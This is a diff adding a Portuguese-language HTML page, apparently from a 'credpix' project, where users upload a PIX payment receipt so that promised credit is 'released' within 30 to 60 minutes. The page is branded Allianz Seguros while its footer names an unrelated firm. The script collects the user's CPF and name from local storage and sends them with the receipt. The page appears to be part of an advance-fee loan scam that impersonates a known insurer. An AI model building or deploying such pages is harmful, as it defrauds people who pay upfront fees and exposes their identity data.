@@ -1,0 +1,312 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script src="/js/clarity.js"></script>
+    <script src="/js/gtag.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviar comprovante</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fff;
+            color: #0f172a;
+            min-height: 100vh;
+        }
+        .m2-header {
+            background: linear-gradient(135deg, #003781 0%, #0054b4 100%);
+            padding: 24px 24px 28px;
+        }
+        .m2-brand { font-size: 18px; font-weight: 900; color: #fff; }
+        .m2-content { padding: 24px; max-width: 480px; margin: 0 auto; }
+        .m2-title { font-size: 22px; font-weight: 800; margin-bottom: 8px; color: #0f172a; }
+        .m2-sub { font-size: 14px; color: #64748b; line-height: 1.55; margin-bottom: 24px; }
+        .upload-zone {
+            border: 2px dashed #cbd5e1;
+            border-radius: 14px;
+            padding: 32px 20px;
+            text-align: center;
+            background: #f8fafc;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        .upload-zone:hover, .upload-zone.dragover {
+            border-color: #003781;
+            background: #eff6ff;
+        }
+        .upload-zone.has-file {
+            border-color: #059669;
+            background: #ecfdf5;
+        }
+        .upload-icon { font-size: 36px; margin-bottom: 10px; }
+        .upload-label { font-size: 15px; font-weight: 600; color: #334155; margin-bottom: 4px; }
+        .upload-hint { font-size: 12px; color: #94a3b8; }
+        .file-name { margin-top: 10px; font-size: 13px; font-weight: 600; color: #059669; word-break: break-all; }
+        #fileInput { display: none; }
+        .btn-submit {
+            width: 100%;
+            margin-top: 16px;
+            padding: 18px;
+            background: #003781;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        .btn-submit:disabled { opacity: 0.55; cursor: not-allowed; }
+        .error-msg {
+            margin-top: 12px;
+            padding: 12px;
+            background: #fee2e2;
+            color: #991b1b;
+            border-radius: 10px;
+            font-size: 13px;
+            display: none;
+        }
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 27, 54, 0.55);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 9999;
+        }
+        .overlay.show { display: flex; }
+        .modal {
+            background: #fff;
+            border-radius: 18px;
+            padding: 28px 24px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(15, 27, 54, 0.25);
+        }
+        .modal-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #d1fae5;
+            color: #059669;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 28px;
+        }
+        .modal h2 { font-size: 20px; margin-bottom: 10px; color: #0f172a; }
+        .modal p { font-size: 14px; color: #64748b; line-height: 1.55; margin-bottom: 20px; }
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            background: #003781;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="stylesheet" href="/css/credpix-footer.css">
+    <link rel="stylesheet" href="/css/credpix-brand.css">
+    <script src="/js/credpix-brand.js"></script>
+</head>
+<body data-credpix-legal-footer="skip">
+    <div class="m2-header">
+        <div class="m2-brand">Allianz Seguros</div>
+    </div>
+
+    <main class="m2-content">
+        <h1 class="m2-title">Comprovante de pagamento</h1>
+        <p class="m2-sub">
+            Anexe o comprovante do PIX que você acabou de pagar.
+            Nossa equipe vai validar e liberar seu crédito em breve.
+        </p>
+
+        <form id="uploadForm">
+            <label class="upload-zone" id="dropZone" for="fileInput">
+                <div class="upload-icon">📎</div>
+                <div class="upload-label">Toque para selecionar o arquivo</div>
+                <div class="upload-hint">JPG, PNG, WEBP ou PDF · máx. 3 MB</div>
+                <div class="file-name" id="fileName"></div>
+            </label>
+            <input type="file" id="fileInput" accept="image/jpeg,image/png,image/webp,image/heic,image/heif,application/pdf">
+
+            <button type="submit" class="btn-submit" id="submitBtn" disabled>Enviar comprovante</button>
+            <div class="error-msg" id="errorMsg"></div>
+        </form>
+    </main>
+
+    <div class="overlay" id="successOverlay" role="dialog" aria-modal="true">
+        <div class="modal">
+            <div class="modal-icon">✓</div>
+            <h2>Comprovante recebido!</h2>
+            <p>
+                Seu pagamento está em análise. O valor será creditado na sua conta em
+                <strong>30 a 60 minutos</strong>, após a confirmação bancária.
+            </p>
+            <button type="button" class="modal-btn" id="closeModalBtn">Entendi</button>
+        </div>
+    </div>
+
+    <footer class="credpix-site-footer">
+        <p>13.212.952 A&G ASSESSORIA FINANCEIRA LTDA — CNPJ: 13.212.952/0001-10. Todos os serviços são de responsabilidade da empresa acima identificada.</p>
+    </footer>
+
+    <script src="/js/credpix-boot.js"></script>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const transactionId = params.get('transaction_id') || '';
+        const step = params.get('step') || 'main';
+        const valueParam = parseFloat(params.get('value') || '');
+        const purchaseValue = Number.isFinite(valueParam) && valueParam > 0 ? valueParam : 29.9;
+
+        if (window.credpixTrackComprovantePage) {
+            window.credpixTrackComprovantePage({
+                transactionId: transactionId,
+                value: purchaseValue,
+                currency: 'BRL',
+            });
+        }
+
+        const fileInput = document.getElementById('fileInput');
+        const dropZone = document.getElementById('dropZone');
+        const fileNameEl = document.getElementById('fileName');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const uploadForm = document.getElementById('uploadForm');
+        const successOverlay = document.getElementById('successOverlay');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+
+        let selectedFile = null;
+
+        function lsKey(name) {
+            if (window.credpixStorageKey) return window.credpixStorageKey(name);
+            return name;
+        }
+
+        function getStoredLead() {
+            const keys = [lsKey('lead'), 'credpix:_root:lead', 'credpix:_empa:lead', 'credpix_lead'];
+            for (const key of keys) {
+                try {
+                    const raw = localStorage.getItem(key);
+                    if (!raw) continue;
+                    const lead = JSON.parse(raw);
+                    if (lead && (lead.cpf_digits || lead.cpf || lead.nome)) return lead;
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
+        }
+
+        function clearError() {
+            errorMsg.textContent = '';
+            errorMsg.style.display = 'none';
+        }
+
+        function setFile(file) {
+            if (!file) return;
+            const allowed = ['image/jpeg', 'image/png', 'image/webp', 'image/heic', 'image/heif', 'application/pdf'];
+            if (!allowed.includes(file.type)) {
+                showError('Envie uma imagem (JPG, PNG, WEBP) ou PDF.');
+                return;
+            }
+            if (file.size > 3 * 1024 * 1024) {
+                showError('O arquivo deve ter no máximo 3 MB.');
+                return;
+            }
+            clearError();
+            selectedFile = file;
+            fileNameEl.textContent = file.name;
+            dropZone.classList.add('has-file');
+            submitBtn.disabled = false;
+        }
+
+        fileInput.addEventListener('change', () => {
+            if (fileInput.files && fileInput.files[0]) setFile(fileInput.files[0]);
+        });
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.classList.add('dragover');
+        });
+        dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.classList.remove('dragover');
+            if (e.dataTransfer.files && e.dataTransfer.files[0]) setFile(e.dataTransfer.files[0]);
+        });
+
+        function readFileAsBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const result = String(reader.result || '');
+                    const base64 = result.includes(',') ? result.split(',')[1] : result;
+                    resolve(base64);
+                };
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+
+        uploadForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!selectedFile) {
+                showError('Selecione um comprovante para continuar.');
+                return;
+            }
+
+            clearError();
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Enviando…';
+
+            try {
+                const lead = getStoredLead() || {};
+                const cpf = String(lead.cpf_digits || lead.cpf || '').replace(/\D/g, '');
+                const base64 = await readFileAsBase64(selectedFile);
+
+                const res = await fetch('/api/receipts/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        transaction_id: transactionId,
+                        step,
+                        customer_cpf: cpf,
+                        customer_name: lead.nome || lead.name || '',
+                        file_base64: base64,
+                        file_name: selectedFile.name,
+                        mime_type: selectedFile.type,
+                    }),
+                });
+
+                const data = await res.json().catch(() => ({}));
+                if (!res.ok || !data.success) {
+                    throw new Error((data && data.message) || 'Falha ao enviar. Tente novamente.');
+                }
+
+                successOverlay.classList.add('show');
+            } catch (err) {
+                showError(err.message || 'Erro ao enviar comprovante.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Enviar comprovante';
+            }
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            window.location.href = '/obrigado';
+        });
+    </script>
+</body>
+</html>
+
